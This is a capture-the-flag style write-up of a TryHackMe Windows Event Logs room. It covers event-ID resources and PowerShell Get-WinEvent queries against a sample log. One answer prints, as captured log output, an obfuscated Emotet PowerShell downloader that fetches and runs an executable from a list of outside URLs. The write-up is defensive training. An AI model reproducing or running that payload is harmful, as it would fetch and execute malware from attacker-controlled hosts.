When it comes to monitoring and hunting, you need to know what you are looking for. There are a large number of event IDs in use. This section is aimed at assisting you with this task. There are plenty of blogs, writeups, etc., on this topic. A few resources will be shared in this section. Please note this is not an exhaustive list.

First on the list is [The Windows Logging Cheat Sheet (Windows 7 - Windows 2012)](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/580595db9f745688bc7477f6/1476761074992/Windows+Logging+Cheat+Sheet_ver_Oct_2016.pdf). The last version update is October 2016, but it's still a good resource. The document covers a few things that need to be enabled and configured and what event IDs to look for based on different categories, such as Accounts, Processes, Log Clear, etc.

![Windows Logging Cheat Sheet](Images/Windows_Logging_Cheat_Sheet.png)

Above is a snippet from the cheat sheet. Want to detect if a new service was installed? Look for **Event ID 7045** within the **System Log**.

Next is [Spotting the Adversary with Windows Event Log Monitoring](https://web.archive.org/web/20190115215749/https://apps.nsa.gov/iaarchive/customcf/openAttachment.cfm?FilePath=/iad/library/ia-guidance/security-configuration/applications/assets/public/upload/Spotting-the-Adversary-with-Windows-Event-Log-Monitoring.pdf&WpKes=aF6woL7fQp3dJiqyJL2LenrLxuHC7ztGtVNK3x). This NSA resource is also a bit outdated but good enough to build upon your foundation. The document covers some concepts touched on in this room and beyond.

![Windows Firewall Events](Images/Windows_Firewall_Events.png)

Above is a snippet from the document. Maybe you want to monitor if a firewall rule was deleted from the host. That is **Event ID 2006/2033**.

Where else can we get a list of event IDs to monitor/hunt for? [MITRE ATT&CK](https://attack.mitre.org/)!

If you are unfamiliar with MITRE or MITRE ATT&CK, I suggest you check out the [MITRE Room](https://tryhackme.com/room/mitre).

Let's look at ATT&CK ID [T1098](https://attack.mitre.org/techniques/T1098/) (Account Manipulation). Each ATT&CK ID will contain a section sharing tips to mitigate the technique and detection tips.

![Mitre Attack Account Manipulation](Images/Mitre_Attack_Account_Manipulation.png)

The last two resources are from **Microsoft**:

- [Events to Monitor](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor) (Best Practices for Securing Active Directory)
- [The Windows 10 and Windows Server 2016 Security Auditing and Monitoring Reference](https://www.microsoft.com/en-us/download/details.aspx?id=52630) (a comprehensive list [over 700 pages])

![Security Auditing and Monitoring Reference](Images/Security_Auditing_and_Monitoring_Reference.png)

**Note**: Some events will not be generated by default, and certain features will need to be enabled/configured on the endpoint, such as PowerShell logging. This feature can be enabled via **Group Policy** or the **Registry**.

`Local Computer Policy > Computer Configuration > Administrative Templates > Windows Components > Windows PowerShell`

![PowerShell Auditing GPO Settings](Images/PowerShell_Auditing_GPO_Settings.png)

Some resources to provide more information about enabling this feature, along with its associated event IDs:

- [About Logging Windows](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1)
- [Greater Visibility Through PowerShell Logging](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)
- [Configure PowerShell logging to see PowerShell anomalies in Splunk UBA](https://docs.splunk.com/Documentation/UBA/5.0.4/GetDataIn/AddPowerShell)

![PowerShell Splunk Queries](Images/PowerShell_Splunk_Queries.png)

Another feature to enable/configure is **Audit Process Creation**, which will generate **event ID 4688**. This will allow **command-line process auditing**. This setting is NOT enabled in the virtual machine but feel free to enable it and observe the events generated after executing some commands.

`Local Computer Policy > Computer Configuration > Administrative Templates > System > Audit Process Creation`

![Command-line Auditing](Images/Command-line_Auditing.png)

To read more about this feature, refer to [docs.microsoft.com](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing#try-this-explore-command-line-process-auditing). The steps to test the configuration are at the bottom of the document.

![Command-line Auditing 2](Images/Command-line_Auditing_2.png)

To conclude this section, it will be reiterated that this is not an exhaustive list. There are countless blogs, writeups, threat intel reports, etc., on this topic.

To effectively monitor and detect, you need to know what to look for (as mentioned earlier).

---------------------------------------------------------------------------------------

### Task 7: Putting theory into practice

**Note**: To successfully answer the questions below, you may need to search online for more information.

The next scenarios/questions are based on the external event log file titled `merged.evtx` found on the **Desktop**. You can use any of the aforementioned tools to answer the questions below.

**Scenario 1 (Questions 1 & 2)**: The server admins have made numerous complaints to Management regarding PowerShell being blocked in the environment. Management finally approved the usage of PowerShell within the environment. Visibility is now needed to ensure there are no gaps in coverage. You researched this topic: what logs to look at, what event IDs to monitor, etc. You enabled PowerShell logging on a test machine and had a colleague execute various commands.

**Scenario 2 (Questions 3 & 4)**: The Security Team is using Event Logs more. They want to ensure they can monitor if event logs are cleared. You assigned a colleague to execute this action.

**Scenario 3 (Questions 5, 6 & 7)**: The threat intel team shared its research on **Emotet**. They advised searching for event ID 4104 and the text "ScriptBlockText" within the EventData element. Find the encoded PowerShell payload.

**Scenario 4 (Questions 8 & 9)**: A report came in that an intern was suspected of running unusual commands on her machine, such as enumerating members of the Administrators group. A senior analyst suggested searching for `C:\Windows\System32\net1.exe`. Confirm the suspicion.

---------------------------------------------------------------------------------------

#### What event ID is to detect a PowerShell downgrade attack?

See [Detecting and Preventing PowerShell Downgrade Attacks](https://www.leeholmes.com/detecting-and-preventing-powershell-downgrade-attacks/).

Answer: `400`

#### What is the Date and Time this attack took place? (MM/DD/YYYY H:MM:SS [AM/PM])

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx';id=400} | Foreach-Object {$version = [Version] ($_.Message -replace '(?s).*EngineVersion=([\d\.]+)*.*','$1'); if($version -lt ([Version] "5.0")) { $_ } }


   ProviderName: PowerShell

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
12/18/2020 7:50:33 AM          400 Information      Engine state is changed from None to Available. ...


PS C:\Users\Administrator\Desktop>
```

Answer: `12/18/2020 7:50:33 AM`

#### A Log clear event was recorded. What is the 'Event Record ID'?

Hint: Check XML View

Log cleared events are available under two different events IDs:

- EID 1102 for the Security log
- EID 104 for all other logs

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx';id=1102}
Get-WinEvent : No events were found that match the specified selection criteria.
At line:1 char:1
+ Get-WinEvent -FilterHashtable @{path='merged.evtx';id=1102}
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (:) [Get-WinEvent], Exception
    + FullyQualifiedErrorId : NoMatchingEventsFound,Microsoft.PowerShell.Commands.GetWinEventCommand

PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx';id=104}


   ProviderName: Microsoft-Windows-Eventlog

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
3/19/2019 4:34:25 PM           104 Information      The System log file was cleared.


PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx';id=104} | Select-Object -Property RecordId, TimeCreated, Message

RecordId TimeCreated          Message
-------- -----------          -------
   27736 3/19/2019 4:34:25 PM The System log file was cleared.


PS C:\Users\Administrator\Desktop>
```

Answer: `27736`

#### What is the name of the computer?

The name of the computer can be found in the `MachineName` field of all events. And in this case the machine names changed a lot in the beginning:

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx'} -MaxEvents 20 -Oldest | Select-Object -Property MachineName

MachineName
-----------
PC01.example.corp
MSEDGEWIN10
MSEDGEWIN10
MSEDGEWIN10
DESKTOP-RIPCLIP
DESKTOP-RIPCLIP
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
WIN-1O0UJBNP9G7
```

The expected answer is from the earliest event, the EID 104 event above:

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx';id=104} | Select-Object -Property MachineName

MachineName
-----------
PC01.example.corp


PS C:\Users\Administrator\Desktop>
```

Answer: `PC01.example.corp`

#### What is the name of the first variable within the PowerShell command?

Hint: For XPath query use -Oldest -MaxEvents 1 and pipe to Format-List

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -FilterHashtable @{path='merged.evtx';id=4104} -Oldest -MaxEvents 1 | Format-Table -AutoSize -Wrap


   ProviderName: Microsoft-Windows-PowerShell

TimeCreated             Id LevelDisplayName Message
-----------             -- ---------------- -------
8/25/2020 10:09:28 PM 4104 Verbose          Creating Scriptblock text (1 of 1):
                                            $Va5w3n8=(('Q'+'2h')+('w9p'+'1'));&('ne'+'w-'+'item') $eNV:teMP\WOrd\2019\ -itemtype
                                            DIrectOry;[Net.ServicePointManager]::"SecURi`T`ypRO`T`oCOL" = ('t'+'ls'+'1'+('2, tl'+'s')+'11'+(',
                                            '+'tls'));$Depssu0 = (('D'+'yx')+('x'+'ur4g')+'x');$A74_j9r=('T'+'4'+('gf45'+'h'));$Fdkhtf_=$env:temp+(('{0}'+
                                            'word{'+'0}'+('2'+'01')+'9{0}') -F
                                            [CHAr]92)+$Depssu0+('.'+('ex'+'e'));$O39nj1p=('J6'+'9l'+('hm'+'h'));$Z8i525z=&('new-'+'obje'+'c'+'t') neT.WEbc
                                            LiENt;$Iwmfahs=(('h'+'ttp')+(':'+'//')+('q'+'u'+'anticaelectro'+'n'+'ic')+('s.com'+'/')+'w'+'p-'+'a'+('d'+'min
                                            ')+'/'+'7A'+('Tr78'+'/*'+'htt')+('p'+'s:/')+('/r'+'e')+'be'+('l'+'co')+'m'+'.'+('ch/'+'pi'+'c')+('ture'+'_')+(
                                            'l'+'ibra'+'ry/bbCt')+('l'+'S/')+('*ht'+'tp'+'s:/')+('/re'+'al')+'e'+'s'+('tate'+'a')+('gen'+'t')+'te'+('am.co
                                            '+'m')+'/'+('163/Q'+'T')+'d'+('/'+'*ht'+'tps:')+'//'+('w'+'ww.')+('ri'+'dd')+('hi'+'display.'+'c'+'o')+'m/'+'r
                                            '+'id'+'d'+('hi'+'/1pKY/'+'*htt')+'p'+(':'+'//')+('radi'+'osu'+'bmit.com/'+'sear')+('ch_'+'tes'+'t')+'/'+'p'+(
                                            '/*'+'h')+('ttp'+':/')+'/'+('res'+'e')+'ar'+('ch'+'c')+'he'+'m'+('plu'+'s.'+'c')+('om/w'+'p-')+('a'+'dmin')+'/
                                            1'+('OC'+'C')+'/'+('*http:'+'/')+('/s'+'zymo')+('ns'+'zyp')+'er'+('sk'+'i')+('.'+'pl/a')+'ss'+('ets/'+'p')+'k/
                                            ')."S`Plit"([char]42);$Zxnbryr=(('Dp'+'z9')+'4'+'a6');foreach($Mqku5a2 in
                                            $Iwmfahs){try{$Z8i525z."d`OWN`load`FIlE"($Mqku5a2, $Fdkhtf_);$Lt8bjj7=('Ln'+('wp'+'ag')+'m');If
                                            ((.('Get-I'+'t'+'em') $Fdkhtf_)."le`NgTH" -ge 28315) {cp (gcm calc).path $Fdkhtf_ -Force; .('Invo'+'ke'+'-Item
                                            ')($Fdkhtf_);$Nfgrgu9=(('Qj6'+'bs')+'x'+'n');break;$D7ypgo1=('Bv'+('e'+'bc')+'k0')}}catch{}}$Gmk6zmk=(('Z2x'+'
                                            aaj')+'0')

                                            ScriptBlock ID: fdd51159-9602-40cb-839d-c31039ebbc3a
                                            Path:


PS C:\Users\Administrator\Desktop>
```

Answer: `$Va5w3n8`

#### What is the Date and Time this attack took place? (MM/DD/YYYY H:MM:SS [AM/PM])

See output above.

Answer: `8/25/2020 10:09:28 PM`

#### What is the Execution Process ID?

The easiest way to find this answer is via **Event Viewer**

![Event Viewer Merged Analysis 1](Images/Event_Viewer_Merged_Analysis_1.png)

Answer: `6620`´

#### What is the Group Security ID of the group she enumerated?

The event we should look for is EID 4799 ([A security-enabled local group membership was enumerated](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4799)) and the calling process should, according to the scenario description, be `C:\Windows\System32\net1.exe`

We check the field names in **Event Viewer** by filtering for EID 4799 events:

![Event Viewer Merged Analysis 2](Images/Event_Viewer_Merged_Analysis_2.png)

We should use the field `CallerProcessName`.

```powershell
PS C:\Users\Administrator\Desktop> Get-WinEvent -Path "merged.evtx" -FilterXPath "*[EventData/Data[@Name='CallerProcessName']='C:\Windows\System32\net1.exe
'] and */System[EventID=4799]"


   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
8/5/2019 2:25:03 AM           4799 Information      A security-enabled local group membership was enumerated....


PS C:\Users\Administrator\Desktop> Get-WinEvent -Path "merged.evtx" -FilterXPath "*[EventData/Data[@Name='CallerProcessName']='C:\Windows\System32\net1.exe
'] and */System[EventID=4799]" | Format-List


TimeCreated  : 8/5/2019 2:25:03 AM
ProviderName : Microsoft-Windows-Security-Auditing
Id           : 4799
Message      : A security-enabled local group membership was enumerated.

               Subject:
                Security ID:            S-1-5-21-3461203602-4096304019-2269080069-1000
                Account Name:           IEUser
                Account Domain:         MSEDGEWIN10
                Logon ID:               0x2E47A

               Group:
                Security ID:            S-1-5-32-544
                Group Name:             Administrators
                Group Domain:           Builtin

               Process Information:
                Process ID:             0x5c0
                Process Name:           C:\Windows\System32\net1.exe
```

Answer: `S-1-5-32-544`

#### What is the event ID?

Answer: `4799`

### Task 8: Conclusion

In this room, we covered Windows Event Logs, what they are, and how to query them using various tools and techniques.

We also briefly discussed various features within Windows that you need to enable/configure to log additional events to gain visibility into those processes/features that are turned off by default.

The information covered in this room will serve as a primer for other rooms covering [Windows Internals](https://tryhackme.com/jr/windowsinternals), [Sysmon](https://tryhackme.com/jr/sysmon), and various [SIEM](https://tryhackme.com/jr/splunk101) tools.

I'll end this room by providing additional reading material:

- [EVTX Attack Samples](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES) (a few were used in this room)
- [PowerShell <3 the Blue Team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)
- [Tampering with Windows Event Tracing: Background, Offense, and Defense](https://medium.com/palantir/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63)

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [about_Hash_Tables - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_hash_tables?view=powershell-7.5&viewFallbackFrom=powershell-7.1)
- [Creating Get-WinEvent queries with FilterHashtable - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/scripting/samples/creating-get-winevent-queries-with-filterhashtable?view=powershell-7.5&viewFallbackFrom=powershell-7.1)
- [Event Viewer - Wikipedia](https://en.wikipedia.org/wiki/Event_Viewer)
- [Events to monitor - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/appendix-l--events-to-monitor)
- [Get-WinEvent - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Diagnostics/Get-WinEvent?view=powershell-5.1)
- [Spotting the Adversary with Windows Event Log Monitoring - NSA](https://web.archive.org/web/20190115215749/https://apps.nsa.gov/iaarchive/customcf/openAttachment.cfm?FilePath=/iad/library/ia-guidance/security-configuration/applications/assets/public/upload/Spotting-the-Adversary-with-Windows-Event-Log-Monitoring.pdf&WpKes=aF6woL7fQp3dJiqyJL2LenrLxuHC7ztGtVNK3x)
- [The Windows 10 and Windows Server 2016 Security Auditing and Monitoring Reference - Microsoft Learn](https://www.microsoft.com/en-us/download/details.aspx?id=52630)
- [The Windows Logging Cheat Sheet - MalwareArchaeology.com](https://www.malwarearchaeology.com/s/Windows-Logging-Cheat-Sheet_ver_Feb_2019.pdf)
- [wevtutil - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil)
- [XPath 1.0 limitations - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/wes/consuming-events#limitations)
- [XPath Reference - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/dotnet/netframework-4.0/ms256115(v=vs.100))
